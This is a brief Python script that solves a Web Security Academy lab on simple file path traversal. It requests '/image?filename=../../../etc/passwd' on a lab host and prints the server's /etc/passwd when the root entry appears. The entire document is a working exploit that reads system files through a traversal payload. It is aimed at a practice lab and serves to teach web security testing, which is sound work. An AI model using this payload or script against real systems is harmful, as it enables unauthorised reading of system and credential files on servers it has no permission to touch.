import requests
import sys

# --- Configuration ---
# Lab: File path traversal, simple case
# Replace with your specific lab ID
BASE_URL = "https://0a9b003e041d63d180a1125800520072.web-security-academy.net"

def exploit_path_traversal(base_url):
    """
    Exploits a simple path traversal vulnerability to read /etc/passwd.
    """
    # Target Endpoint
    target_url = base_url + "/image?filename=../../../etc/passwd"
    
    print(f"[*] Sending payload to: {target_url}")
    
    # Send GET request
    response = requests.get(target_url)
    
    # Verify and print output
    if "root:x:0:0" in response.text:
        print("[+] Success! /etc/passwd retrieved:\n")
        print(response.text)
    else:
        print("[-] Exploit failed. Output:")
        print(response.text[:200]) # Print first 200 chars to debug

if __name__ == "__main__":
    exploit_path_traversal(BASE_URL)